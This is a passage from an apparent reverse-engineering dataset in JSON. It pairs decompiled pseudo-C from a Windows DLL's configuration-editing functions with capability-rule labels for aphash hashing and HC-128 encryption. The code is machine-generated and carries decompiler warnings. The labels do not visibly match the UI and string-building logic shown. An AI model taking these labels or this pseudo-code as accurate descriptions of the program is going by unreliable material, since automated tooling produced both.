        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18003a610(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int64_t **ppiVar4;\n    int64_t **ppiVar5;\n    ulong uVar6;\n    ulong uVar7;\n    int64_t *piVar8;\n    uchar *puVar9;\n    int64_t iVar10;\n    uint64_t uVar11;\n    char *pcVar12;\n    uchar *puVar13;\n    int64_t *piVar14;\n    int64_t arg3;\n    char *pcVar15;\n    ushort *puVar16;\n    uint64_t uVar17;\n    int64_t iVar18;\n    uchar auStack504 [32];\n    ulong uStack472;\n    uint uStack456;\n    char *pcStack448;\n    char cStack440;\n    unkbyte7 Stack439;\n    uint uStack424;\n    uint uStack420;\n    uint uStack416;\n    uint uStack412;\n    char *pcStack408;\n    int64_t iStack400;\n    char acStack392 [32];\n    ulong uStack360;\n    uchar auStack344 [128];\n    char cStack216;\n    unkbyte7 Stack215;\n    int64_t iStack200;\n    uint64_t uStack192;\n    uchar uStack184;\n    unkbyte7 Stack183;\n    uint64_t uStack168;\n    uint64_t uStack160;\n    ulong uStack152;\n    uchar auStack144 [16];\n    int64_t iStack128;\n    ushort uStack120;\n    unkbyte6 Stack118;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack88;\n    unkbyte7 Stack87;\n    ulong uStack72;\n    uint64_t uStack64;\n    uint64_t uStack56;\n    \n    uStack360 = 0xfffffffffffffffe;\n    uStack56 = *0x180123080 ^ auStack504;\n    uStack456 = 0;\n    auStack144 = ZEXT816(0);\n    iStack128 = 0;\n    iStack400 = arg1;\n    fcn.180037720(arg1, auStack144);\n    fcn.18003a4e0(arg1, &uStack184);\n    if (uStack168 < 3) {\ncode_r0x00018003b352:\n        if (0xf < uStack160) {\n            iVar10 = CONCAT71(Stack183, uStack184);\n            iVar18 = iVar10;\n            if ((0xfff < uStack160 + 1) && (iVar18 = *(iVar10 + -8),  0x1f < (iVar10 - iVar18) - 8U)) {\ncode_r0x00018003b4a1:\n                fcn.1800b3528();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            fcn.18008fb24(iVar18);\n        }\n        uStack168 = 0;\n        uStack160 = 0xf;\n        uStack184 = 0;\n        if (auStack144._0_8_ == 0) goto code_r0x00018003b411;\n        if (auStack144._0_8_ != auStack144._8_8_) {\n            do {\n                fcn.180037040(auStack144._0_8_);\n                auStack144._0_8_ = auStack144._0_8_ + 0x48;\n            } while (auStack144._0_8_ != auStack144._8_8_);\n        }\n        uVar17 = ((iStack128 - auStack144._0_8_) / 0x48) * 0x48;\n        iVar18 = auStack144._0_8_;\n        if (0xfff < uVar17) {\n            iVar18 = *(auStack144._0_8_ + -8);\n            if (0x1f < (auStack144._0_8_ - iVar18) - 8U) {\n                fcn.1800b3528(iStack128 - auStack144._0_8_, uVar17 + 0x27);\ncode_r0x00018003b447:\n                fcn.1800b3528();\n                goto code_r0x00018003b44d;\n            }\n        }\n        fcn.18008fb24(iVar18);\ncode_r0x00018003b411:\n        fcn.18008fb00(uStack56 ^ auStack504);\n        return;\n    }\n    iVar18 = arg1 + 0x38;\n    ppiVar4 = fcn.18000de50(&cStack440, iVar18);\n    ppiVar5 = ppiVar4;\n    if (0xf < ppiVar4[3]) {\n        ppiVar5 = *ppiVar4;\n    }\n    puVar9 = &uStack184;\n    if (0xf < uStack160) {\n        puVar9 = CONCAT71(Stack183, uStack184);\n    }\n    (**0x1800de490)(puVar9, 0, 0, ppiVar5);\n    if (ppiVar4[3] < 0x10) {\ncode_r0x00018003a710:\n        ppiVar4[2] = NULL;\n        ppiVar4[3] = 0xf;\n        *ppiVar4 = 0;\n        pcStack448 = &cStack440;\n        ppiVar5 = fcn.18000de50(&cStack440, iVar18);\n        iStack200 = CONCAT44(*0x180101914, *0x180101910);\n        uStack192 = CONCAT44(*0x18010191c, *0x180101918);\n        cStack216 = '\\0';\n        uStack152 = ppiVar5;\n        fcn.180011120(&cStack216, 0x1800f7520, 8);\n        if ((ppiVar5[2] == NULL) && (ppiVar5 != 0x1801255d8)) {\n            uVar6 = 0x1801255d8;\n            if (0xf < *0x1801255f0) {\n                uVar6 = *0x1801255d8;\n            }\n            fcn.180011120(ppiVar5, uVar6, *0x1801255e8);\n        }\n        ppiVar4 = ppiVar5;\n        if (0xf < ppiVar5[3]) {\n            ppiVar4 = *ppiVar5;\n        }\n        piVar14 = arg1 + 0x58;\n        if (0xf < *(arg1 + 0x70)) {\n            piVar14 = *piVar14;\n        }\n        pcVar15 = &cStack216;\n        if (0xf < uStack192) {\n            pcVar15 = CONCAT71(Stack215, cStack216);\n        }\n        puVar9 = &uStack184;\n        if (0xf < uStack160) {\n            puVar9 = CONCAT71(Stack183, uStack184);\n        }\n        (**0x1800de490)(puVar9, pcVar15, piVar14, ppiVar4);\n        if (0xf < ppiVar5[3]) {\n            piVar14 = *ppiVar5;\n            piVar8 = piVar14;\n            if ((ppiVar5[3] + 1U < 0x1000) || (piVar8 = piVar14[-1],  piVar14 + (-8 - piVar8) < 0x20)) {\n                fcn.18008fb24(piVar8);\n                goto code_r0x00018003a812;\n            }\n            goto code_r0x00018003b453;\n        }\ncode_r0x00018003a812:\n        ppiVar5[2] = NULL;\n        ppiVar5[3] = 0xf;\n        *ppiVar5 = 0;\n        if (0xf < uStack192) {\n            iVar2 = CONCAT71(Stack215, cStack216);\n            iVar10 = iVar2;\n            if ((uStack192 + 1 < 0x1000) || (iVar10 = *(iVar2 + -8),  (iVar2 - iVar10) - 8U < 0x20)) {\n                fcn.18008fb24(iVar10);\n                goto code_r0x00018003a85c;\n            }\n            goto code_r0x00018003b447;\n        }\ncode_r0x00018003a85c:\n        pcStack448 = &cStack216;\n        uStack472 = fcn.18000de50(&cStack216, iVar18);\n        uStack424 = *0x180101910;\n        uStack420 = *0x180101914;\n        uStack416 = *0x180101918;\n        uStack412 = *0x18010191c;\n        cStack440 = '\\0';\n        pcVar15 = &cStack440;\n        fcn.180011120(pcVar15, 0x1800f7538, 9);\n        fcn.180005380(pcVar15, &uStack184, &cStack440, arg1 + 0x78);\n        if (0xf < CONCAT44(uStack412, uStack416)) {\n            iVar2 = CONCAT71(Stack439, cStack440);\n            iVar10 = iVar2;\n            if ((CONCAT44(uStack412, uStack416) + 1 < 0x1000) || (iVar10 = *(iVar2 + -8),  (iVar2 - iVar10) - 8U < 0x20)\n               ) {\n                fcn.18008fb24(iVar10);\n                goto code_r0x00018003a8f4;\n            }\n            goto code_r0x00018003b459;\n        }\ncode_r0x00018003a8f4:\n        pcStack448 = acStack392;\n        ppiVar5 = fcn.18000de50(acStack392, iVar18);\n        iVar10 = (auStack144._8_8_ - auStack144._0_8_) / 0x12 + (auStack144._8_8_ - auStack144._0_8_ >> 0x3f);\n        pcVar15 = &uStack72 + 5;\n        uVar17 = (iVar10 >> 2) - (iVar10 >> 0x3f);\n        do {\n            pcVar15 = pcVar15 + -1;\n            uVar11 = uVar17 / 10;\n            cStack440 = uVar11;\n            *pcVar15 = uVar17 + cStack440 * -10 + '0';\n            uVar17 = uVar11;\n        } while (uVar11 != 0);\n        uStack424 = *0x180101910;\n        uStack420 = *0x180101914;\n        uStack416 = *0x180101918;\n        uStack412 = *0x18010191c;\n        uStack152 = ppiVar5;\n        if (pcVar15 != &uStack72 + 5) {\n            fcn.180011120(&cStack440, pcVar15, &uStack72 + (5 - pcVar15));\n        }\n        iStack200 = CONCAT44(*0x180101914, *0x180101910);\n        uStack192 = CONCAT44(*0x18010191c, *0x180101918);\n        cStack216 = '\\0';\n        fcn.180011120(&cStack216, \"LineItemCount\", 0xd);\n        if ((ppiVar5[2] == NULL) && (ppiVar5 != 0x1801255d8)) {\n            uVar6 = 0x1801255d8;\n            if (0xf < *0x1801255f0) {\n                uVar6 = *0x1801255d8;\n            }\n            fcn.180011120(ppiVar5, uVar6, *0x1801255e8);\n        }\n        pcVar15 = &cStack440;\n        if (0xf < CONCAT44(uStack412, uStack416)) {\n            pcVar15 = CONCAT71(Stack439, cStack440);\n        }\n        pcVar12 = &cStack216;\n        if (0xf < uStack192) {\n            pcVar12 = CONCAT71(Stack215, cStack216);\n        }\n        puVar9 = &uStack184;\n        if (0xf < uStack160) {\n            puVar9 = CONCAT71(Stack183, uStack184);\n        }\n        (**0x1800de490)(puVar9, pcVar12, pcVar15);\n        if (ppiVar5[3] < 0x10) {\ncode_r0x00018003aa83:\n            ppiVar5[2] = NULL;\n            ppiVar5[3] = 0xf;\n            *ppiVar5 = 0;\n            if (uStack192 < 0x10) {\ncode_r0x00018003aacd:\n                iStack200 = CONCAT44(*0x180101914, *0x180101910);\n                uStack192 = CONCAT44(*0x18010191c, *0x180101918);\n                cStack216 = '\\0';\n                if (0xf < CONCAT44(uStack412, uStack416)) {\n                    iVar2 = CONCAT71(Stack439, cStack440);\n                    iVar10 = iVar2;\n                    if ((0xfff < CONCAT44(uStack412, uStack416) + 1) &&\n                       (iVar10 = *(iVar2 + -8),  0x1f < (iVar2 - iVar10) - 8U)) goto code_r0x00018003b46b;\n                    fcn.18008fb24(iVar10);\n                }\n                uVar17 = 0;\n                iVar10 = auStack144._8_8_ - auStack144._0_8_ >> 0x3f;\n                if ((auStack144._8_8_ - auStack144._0_8_) / 0x48 + iVar10 != iVar10) {\n                    pcStack448 = NULL;\n                    do {\n                        pcVar15 = pcStack448 + auStack144._0_8_;\n                        fcn.180020af0(&uStack152, 4, \"%02d_\", uVar17 & 0xffffffff);\n                        iStack200 = 0;\n                        uStack192 = 0xf;\n                        cStack216 = '\\0';\n                        iVar10 = -1;\n                        do {\n                            arg3 = iVar10 + 1;\n                            iVar2 = iVar10 + -7;\n                            iVar10 = arg3;\n                        } while (auStack144[iVar2] != '\\0');\n                        fcn.180011120(&cStack216, &uStack152, arg3);\n                        pcStack408 = acStack392;\n                        uVar6 = fcn.18000de50(acStack392, iVar18);\n                        uStack72 = 0;\n                        uStack64 = 0xf;\n                        uStack88 = 0;\n                        uStack456 = 7;\n                        if (0xf < iStack200 + 6U) {\n                            fcn.1800137f0(&uStack88, iStack200 + 6U);\n                        }\n                        uStack72 = 0;\n                        fcn.18000dc30(&uStack88, &cStack216);\n                        if (uStack64 - uStack72 < 6) {\n                            uStack472 = 6;\n                            puVar9 = &uStack88;\n                            fcn.180014270(puVar9, 6, 0, \"Prefix\");\n                        }\n                        else {\n                            puVar13 = &uStack88;\n                            if (0xf < uStack64) {\n                                puVar13 = CONCAT71(Stack87, uStack88);\n                            }\n                            puVar13 = puVar13 + uStack72;\n                            puVar9 = puVar13;\n                            uStack72 = uStack72 + 6;\n                            fcn.1800ade80(puVar13, \"Prefix\", 6);\n                            puVar13[6] = 0;\n                        }\n                        uStack472 = uVar6;\n                        fcn.180005380(puVar9, &uStack184, &uStack88, pcVar15);\n                        if (0xf < uStack64) {\n                            iVar2 = CONCAT71(Stack87, uStack88);\n                            iVar10 = iVar2;\n                            if ((0xfff < uStack64 + 1) && (iVar10 = *(iVar2 + -8),  0x1f < (iVar2 - iVar10) - 8U))\n                            goto code_r0x00018003b471;\n                            fcn.18008fb24(iVar10);\n                        }\n                        pcStack408 = acStack392;\n                        uVar6 = fcn.18000de50(acStack392, iVar18);\n                        uVar7 = fcn.180001dd0(&cStack440, *(pcVar15 + 0x20));\n                        uStack72 = 0;\n                        uStack64 = 0xf;\n                        uStack88 = 0;\n                        uStack456 = 0xb;\n                        if (0xf < iStack200 + 6U) {\n                            fcn.1800137f0(&uStack88, iStack200 + 6U);\n                        }\n                        uStack72 = 0;\n                        fcn.18000dc30(&uStack88, &cStack216);\n                        iVar18 = uStack72;\n                        if (uStack64 - uStack72 < 6) {\n                            uStack472 = 6;\n                            puVar9 = &uStack88;\n                            fcn.180014270(puVar9, 6, 0, \"Record\");\n                        }\n                        else {\n                            puVar13 = &uStack88;\n                            if (0xf < uStack64) {\n                                puVar13 = CONCAT71(Stack87, uStack88);\n                            }\n                            puVar9 = puVar13 + uStack72;\n                            uStack72 = uStack72 + 6;\n                            fcn.1800ade80(puVar9, \"Record\", 6);\n                            puVar13[iVar18 + 6] = 0;\n                        }\n                        uStack472 = uVar6;\n                        fcn.180005260(puVar9, &uStack184, &uStack88, uVar7);\n                        if (0xf < uStack64) {\n                            iVar10 = CONCAT71(Stack87, uStack88);\n                            iVar18 = iVar10;\n                            if ((0xfff < uStack64 + 1) && (iVar18 = *(iVar10 + -8),  0x1f < (iVar10 - iVar18) - 8U))\n                            goto code_r0x00018003b477;\n                            fcn.18008fb24(iVar18);\n                        }\n                        uStack72 = 0;\n                        uStack64 = 0xf;\n                        uStack88 = 0;\n                        if (0xf < CONCAT44(uStack412, uStack416)) {\n                            iVar10 = CONCAT71(Stack439, cStack440);\n                            iVar18 = iVar10;\n                            if ((0xfff < CONCAT44(uStack412, uStack416) + 1) &&\n                               (iVar18 = *(iVar10 + -8),  0x1f < (iVar10 - iVar18) - 8U)) goto code_r0x00018003b47d;\n                            fcn.18008fb24(iVar18);\n                        }\n                        pcStack408 = acStack392;\n                        iVar18 = iStack400 + 0x38;\n                        uVar6 = fcn.18000de50(acStack392, iVar18);\n                        uVar7 = fcn.180001dd0(&cStack440, *(pcVar15 + 0x24));\n                        uStack72 = 0;\n                        uStack64 = 0xf;\n                        uStack88 = 0;\n                        uStack456 = 0x13;\n                        if (0xf < iStack200 + 5U) {\n                            fcn.1800137f0(&uStack88, iStack200 + 5U);\n                        }\n                        uStack72 = 0;\n                        fcn.18000dc30(&uStack88, &cStack216);\n                        if (uStack64 - uStack72 < 5) {\n                            uStack472 = 5;\n                            puVar9 = &uStack88;\n                            fcn.180014270(puVar9, 5, 0, 0x1800f7514);\n                        }\n                        else {\n                            puVar13 = &uStack88;\n                            if (0xf < uStack64) {\n                                puVar13 = CONCAT71(Stack87, uStack88);\n                            }\n                            puVar13 = puVar13 + uStack72;\n                            puVar9 = puVar13;\n                            uStack72 = uStack72 + 5;\n                            fcn.1800ade80(puVar13, 0x1800f7514, 5);\n                            puVar13[5] = 0;\n                        }\n                        uStack472 = uVar6;\n                        fcn.180005260(puVar9, &uStack184, &uStack88, uVar7);\n                        if (0xf < uStack64) {\n                            iVar2 = CONCAT71(Stack87, uStack88);\n                            iVar10 = iVar2;\n                            if ((0xfff < uStack64 + 1) && (iVar10 = *(iVar2 + -8),  0x1f < (iVar2 - iVar10) - 8U))\n                            goto code_r0x00018003b483;\n                            fcn.18008fb24(iVar10);\n                        }\n                        uStack72 = 0;\n                        uStack64 = 0xf;\n                        uStack88 = 0;\n                        if (0xf < CONCAT44(uStack412, uStack416)) {\n                            iVar2 = CONCAT71(Stack439, cStack440);\n                            iVar10 = iVar2;\n                            if ((0xfff < CONCAT44(uStack412, uStack416) + 1) &&\n                               (iVar10 = *(iVar2 + -8),  0x1f < (iVar2 - iVar10) - 8U)) goto code_r0x00018003b489;\n                            fcn.18008fb24(iVar10);\n                        }\n                        pcStack408 = acStack392;\n                        uVar6 = fcn.18000de50(acStack392, iVar18);\n                        uStack72 = 0;\n                        uStack64 = 0xf;\n                        uStack88 = 0;\n                        uStack456 = 0x23;\n                        if (0xf < iStack200 + 6U) {\n                            fcn.1800137f0(&uStack88, iStack200 + 6U);\n                        }\n                        uStack72 = 0;\n                        fcn.18000dc30(&uStack88, &cStack216);\n                        if (uStack64 - uStack72 < 6) {\n                            uStack472 = 6;\n                            puVar9 = &uStack88;\n                            fcn.180014270(puVar9, 6, 0, \"Suffix\");\n                        }\n                        else {\n                            puVar13 = &uStack88;\n                            if (0xf < uStack64) {\n                                puVar13 = CONCAT71(Stack87, uStack88);\n                            }\n                            puVar13 = puVar13 + uStack72;\n                            puVar9 = puVar13;\n                            uStack72 = uStack72 + 6;\n                            fcn.1800ade80(puVar13, \"Suffix\", 6);\n                            puVar13[6] = 0;\n                        }\n                        uStack472 = uVar6;\n                        fcn.180005380(puVar9, &uStack184, &uStack88, pcVar15 + 0x28);\n                        if (0xf < uStack64) {\n                            iVar2 = CONCAT71(Stack87, uStack88);\n                            iVar10 = iVar2;\n                            if (0xfff < uStack64 + 1) {\n                                iVar10 = *(iVar2 + -8);\n                                if (0x1f < (iVar2 - iVar10) - 8U) {\n                                    fcn.1800b3528(iVar10, uStack64 + 0x28);\n                                    goto code_r0x00018003b495;\n                                }\n                            }\n                            fcn.18008fb24(iVar10);\n                        }\n                        if (0xf < uStack192) {\n                            iVar2 = CONCAT71(Stack215, cStack216);\n                            iVar10 = iVar2;\n                            if ((0xfff < uStack192 + 1) && (iVar10 = *(iVar2 + -8),  0x1f < (iVar2 - iVar10) - 8U)) {\ncode_r0x00018003b495:\n                                fcn.1800b3528();\n                                pcVar1 = swi(3);\n                                (*pcVar1)();\n                                return;\n                            }\n                            fcn.18008fb24(iVar10);\n                        }\n                        uVar17 = uVar17 + 1;\n                        pcStack448 = pcStack448 + 0x48;\n                        arg1 = iStack400;\n                    } while (uVar17 < (auStack144._8_8_ - auStack144._0_8_) / 0x48);\n                }\n                uVar6 = fcn.1800687b0(auStack344);\n                puVar9 = &uStack184;\n                if (0xf < uStack160) {\n                    puVar9 = CONCAT71(Stack183, uStack184);\n                }\n                fcn.180069050(uVar6, &uStack120, puVar9, puVar9 + uStack168);\n                fcn.1800686c0(auStack344);\n                puVar16 = &uStack120;\n                if (7 < CONCAT44(uStack92, uStack96)) {\n                    puVar16 = CONCAT62(Stack118, uStack120);\n                }\n                iVar18 = (**0x1800de7f0)(*(arg1 + 0xa8), 0x14c, 0xffffffffffffffff, puVar16);\n                if (iVar18 == -1) {\n                    puVar16 = &uStack120;\n                    if (7 < CONCAT44(uStack92, uStack96)) {\n                        puVar16 = CONCAT62(Stack118, uStack120);\n                    }\n                    iVar3 = (**0x1800de7f0)(*(arg1 + 0xa8), 0x143, 0, puVar16);\n                    uVar6 = *(arg1 + 0xa8);\n                    (**0x1800de7f0)(uVar6, 0x14e, iVar3, 0);\n                    (**0x1800de5b8)(uVar6, 0, 0);\n                }\n                fcn.180039180(arg1);\n                if (7 < CONCAT44(uStack92, uStack96)) {\n                    iVar18 = CONCAT44(uStack92, uStack96) * 2;\n                    iVar2 = CONCAT62(Stack118, uStack120);\n                    iVar10 = iVar2;\n                    if (0xfff < iVar18 + 2U) {\n                        iVar10 = *(iVar2 + -8);\n                        if (0x1f < (iVar2 - iVar10) - 8U) {\n                            fcn.1800b3528(iVar10, iVar18 + 0x29);\n                            goto code_r0x00018003b4a1;\n                        }\n                    }\n                    fcn.18008fb24(iVar10);\n                }\n                uStack104 = *0x180101900;\n                uStack100 = *0x180101904;\n                uStack96 = *0x180101908;\n                uStack92 = *0x18010190c;\n                uStack120 = 0;\n                goto code_r0x00018003b352;\n            }\n            iVar2 = CONCAT71(Stack215, cStack216);\n            iVar10 = iVar2;\n            if ((uStack192 + 1 < 0x1000) || (iVar10 = *(iVar2 + -8),  (iVar2 - iVar10) - 8U < 0x20)) {\n                fcn.18008fb24(iVar10);\n                goto code_r0x00018003aacd;\n            }\n            goto code_r0x00018003b45f;\n        }\n        piVar14 = *ppiVar5;\n        piVar8 = piVar14;\n        if ((ppiVar5[3] + 1U < 0x1000) || (piVar8 = piVar14[-1],  piVar14 + (-8 - piVar8) < 0x20)) {\n            fcn.18008fb24(piVar8);\n            goto code_r0x00018003aa83;\n        }\n    }\n    else {\n        piVar14 = *ppiVar4;\n        piVar8 = piVar14;\n        if ((ppiVar4[3] + 1U < 0x1000) || (piVar8 = piVar14[-1],  piVar14 + (-8 - piVar8) < 0x20)) {\n            fcn.18008fb24(piVar8);\n            goto code_r0x00018003a710;\n        }\ncode_r0x00018003b44d:\n        fcn.1800b3528();\ncode_r0x00018003b453:\n        fcn.1800b3528();\ncode_r0x00018003b459:\n        fcn.1800b3528();\ncode_r0x00018003b45f:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018003b46b:\n    fcn.1800b3528();\ncode_r0x00018003b471:\n    fcn.1800b3528();\ncode_r0x00018003b477:\n    fcn.1800b3528();\ncode_r0x00018003b47d:\n    fcn.1800b3528();\ncode_r0x00018003b483:\n    fcn.1800b3528();\ncode_r0x00018003b489:\n    fcn.1800b3528();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 6666
    },
    "18003b5c": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.18003b5c0(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    uint64_t uVar6;\n    int64_t arg1_00;\n    int32_t iVar7;\n    ulong *puVar8;\n    int64_t *piVar9;\n    int16_t *piVar10;\n    int64_t iVar11;\n    ulong *puVar12;\n    uint64_t uVar13;\n    uchar auStack184 [32];\n    int16_t iStack152;\n    unkbyte6 Stack150;\n    uint64_t uStack136;\n    uint64_t uStack128;\n    int16_t iStack80;\n    int16_t aiStack78 [3];\n    uint64_t uStack72;\n    \n    uStack72 = *0x180123080 ^ auStack184;\n    piVar9 = arg1 + 0xb8;\n    uVar13 = arg2 * 10;\n    uVar6 = (*(arg1 + 0xc0) - *piVar9) / 0x48;\n    if (uVar13 < uVar6) {\n        if (uVar6 < uVar13 + 10) {\n            fcn.18003bf80(piVar9, uVar13 + 10);\n        }\n        *(arg1 + 0x34) = arg2;\n        iVar1 = ((*(arg1 + 0xc0) - *piVar9) / 0x48 + -1) / 10;\n        bVar2 = iVar1 + 1 < 3;\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x259e);\n        (**0x1800de770)(uVar5, bVar2);\n        iVar7 = *(arg1 + 0x34);\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x2524);\n        (**0x1800de770)(uVar5, 0 < iVar7);\n        iVar7 = *(arg1 + 0x34);\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x2525);\n        (**0x1800de770)(uVar5, iVar7 < iVar1);\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x2522);\n        (**0x1800de770)(uVar5, bVar2);\n        iVar7 = *(arg1 + 0x34);\n        uVar5 = (**0x1800de798)(*(arg1 + 0x18), 0x2523);\n        (**0x1800de770)(uVar5, 0 < iVar7);\n        iVar11 = uVar13 * 0x48;\n        iVar7 = 0x2581;\n        do {\n            puVar12 = *(arg1 + 0xb8) + iVar11;\n            puVar8 = puVar12;\n            if (7 < puVar12[3]) {\n                puVar8 = *puVar12;\n            }\n            (**0x1800de788)(*(arg1 + 0x18), iVar7 + -0x3c, puVar8);\n            piVar9 = puVar12 + 5;\n            if (7 < puVar12[8]) {\n                piVar9 = *piVar9;\n            }\n            (**0x1800de788)(*(arg1 + 0x18), iVar7, piVar9);\n            iVar1 = *(puVar12 + 4);\n            uVar5 = (**0x1800de798)(*(arg1 + 0x18), iVar7 + -0x28);\n            (**0x1800de7f0)(uVar5, 0x14e, iVar1, 0);\n            (**0x1800de5b8)(uVar5, 0, 0);\n            fcn.180036af0(arg1, iVar7 - 0x2581);\n            iVar1 = *(puVar12 + 0x24);\n            uVar5 = (**0x1800de798)(*(arg1 + 0x18), iVar7 + -0x14);\n            (**0x1800de7f0)(uVar5, 0x14e, iVar1, 0);\n            (**0x1800de5b8)(uVar5, 0);\n            uVar13 = uVar13 + 1;\n            piVar10 = aiStack78;\n            iVar11 = iVar11 + 0x48;\n            uVar6 = uVar13;\n            do {\n                piVar10 = piVar10 + -1;\n                uStack136 = uVar6 / 10;\n                iStack152 = uStack136;\n                *piVar10 = uVar6 + iStack152 * -10 + 0x30;\n                uVar6 = uStack136;\n            } while (uStack136 != 0);\n            uStack128 = 7;\n            if (piVar10 != aiStack78) {\n                fcn.180010d70(&iStack152, piVar10, aiStack78 - piVar10 >> 1);\n            }\n            piVar10 = &iStack152;\n            if (7 < uStack128) {\n                piVar10 = CONCAT62(Stack150, iStack152);\n            }\n            (**0x1800de788)(*(arg1 + 0x18), iVar7 + -0x50, piVar10);\n            if (7 < uStack128) {\n                iVar4 = CONCAT62(Stack150, iStack152);\n                arg1_00 = iVar4;\n                if (0xfff < uStack128 * 2 + 2) {\n                    arg1_00 = *(iVar4 + -8);\n                    if (0x1f < (iVar4 - arg1_00) - 8U) {\n                        fcn.1800b3528();\n                        pcVar3 = swi(3);\n                        (*pcVar3)();\n                        return;\n                    }\n                }\n                fcn.18008fb24(arg1_00);\n            }\n            iVar1 = iVar7 + -0x2580;\n            iVar7 = iVar7 + 1;\n        } while (iVar1 < 10);\n        fcn.180036d10(arg1, 0);\n    }\n    fcn.18008fb00(uStack72 ^ auStack184);\n    return;\n}\n",
        "token_count": 1443
    },
    "180045cf": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180045cf0(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uchar auVar3 [12];\n    uint64_t arg2;\n    char cVar4;\n    int32_t iVar5;\n    int64_t *piVar6;\n    ushort *puVar7;\n    uint *puVar8;\n    ushort *puVar9;\n    ulong uVar10;\n    int64_t iVar11;\n    ushort *puVar12;\n    int16_t *noname_1;\n    int16_t *arg2_00;\n    int16_t *piVar13;\n    int16_t *piVar14;\n    int16_t *arg2_01;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uchar auStack328 [32];\n    uint64_t uStack296;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uchar auStack264 [16];\n    uint uStack248;\n    ushort uStack240;\n    unkbyte6 Stack238;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    ulong uStack208;\n    uchar auStack200 [16];\n    uchar auStack184 [16];\n    ushort uStack168;\n    unkbyte6 Stack166;\n    uint64_t uStack152;\n    uint64_t uStack144;\n    int16_t iStack96;\n    int16_t aiStack94 [3];\n    uint64_t uStack88;\n    \n    uStack208 = 0xfffffffffffffffe;\n    uStack88 = *0x180123080 ^ auStack328;\n    arg2_01 = NULL;\n    uStack248 = 0;\n    cVar4 = fcn.180020c40();\n    if (cVar4 != '\\0') {\n        iVar5 = (**0x1800de710)(*(arg1 + 0x18), L\"Save the Default Configuration changes as the Primary Configuration?\"\n                                , 0x1800f8310, 0x124);\n        if (iVar5 == 7) goto code_r0x0001800462ae;\n    }\n    if (*(arg1 + 0x54) == '\\0') {\n        fcn.180045730(arg1);\n    }\n    if (*(arg1 + 0x53) == '\\0') {\n        iVar5 = fcn.180044910(arg1);\n        if (iVar5 < 0) goto code_r0x0001800462ae;\n    }\n    if (*(arg1 + 0x52) == '\\0') {\n        iVar5 = fcn.180043650(arg1);\n        if (iVar5 < 0) goto code_r0x0001800462ae;\n    }\n    auStack184 = ZEXT816(7) << 0x40;\n    auStack200 = auStack200 & 0xffffffffffff0000;\n    uStack152 = 0;\n    uStack144 = 7;\n    uStack168 = 0;\n    iVar11 = *(arg1 + 200) - *(arg1 + 0xc0);\n    iVar11 = iVar11 / 6 + (iVar11 >> 0x3f);\n    piVar14 = (iVar11 >> 4) - (iVar11 >> 0x3f);\n    arg2_00 = aiStack94;\n    piVar13 = piVar14;\n    do {\n        arg2_00 = arg2_00 + -1;\n        noname_1 = piVar13 / 10;\n        *arg2_00 = piVar13 + noname_1 * -10 + 0x30;\n        piVar13 = noname_1;\n    } while (noname_1 != NULL);\n    uStack224 = *0x180101900;\n    uStack220 = *0x180101904;\n    uStack216 = *0x180101908;\n    uStack212 = *0x18010190c;\n    uStack240 = 0;\n    if (arg2_00 != aiStack94) {\n        fcn.180010d70(&uStack240, arg2_00, aiStack94 - arg2_00 >> 1);\n        noname_1 = arg2_00;\n    }\n    piVar6 = fcn.180014b80(&uStack240, noname_1, L\"[Base]\\r\\nFoldStructCount=\", 0x18);\n    puVar9 = *piVar6;\n    uStack280._0_2_ = *piVar6;\n    uStack280._2_2_ = *piVar6 >> 0x10;\n    uStack276 = *(piVar6 + 4);\n    uStack272 = *(piVar6 + 1);\n    uStack268 = *(piVar6 + 0xc);\n    auVar3 = **(piVar6 + 2);\n    auStack264 = *(piVar6 + 2);\n    piVar6[2] = 0;\n    piVar6[3] = 7;\n    *piVar6 = 0;\n    auStack264._0_8_ = SUB128(auVar3, 0);\n    auStack264._8_8_ = SUB168(auStack264 >> 0x40, 0);\n    if (auStack264._8_8_ - auStack264._0_8_ < 4) {\n        uStack296 = 4;\n        iVar11 = 0;\n        puVar12 = &uStack280;\n        puVar8 = fcn.180013690(puVar12, 4, 0, 0x1800f83e0);\n    }\n    else {\n        puVar12 = auStack264._0_8_ + 4;\n        auStack264 = CONCAT88(auStack264._8_8_, puVar12);\n        puVar7 = &uStack280;\n        if (7 < auStack264._8_8_) {\n            puVar7 = puVar9;\n        }\n        iVar11 = 0xa000d000a000d;\n        *(puVar7 + auStack264._0_8_) = 0xa000d000a000d;\n        puVar7[puVar12] = 0;\n        puVar8 = &uStack280;\n    }\n    uVar15 = *puVar8;\n    uVar16 = puVar8[1];\n    uVar17 = puVar8[2];\n    uVar18 = puVar8[3];\n    uVar19 = puVar8[4];\n    uVar20 = puVar8[5];\n    uVar21 = puVar8[6];\n    uVar22 = puVar8[7];\n    *(puVar8 + 4) = 0;\n    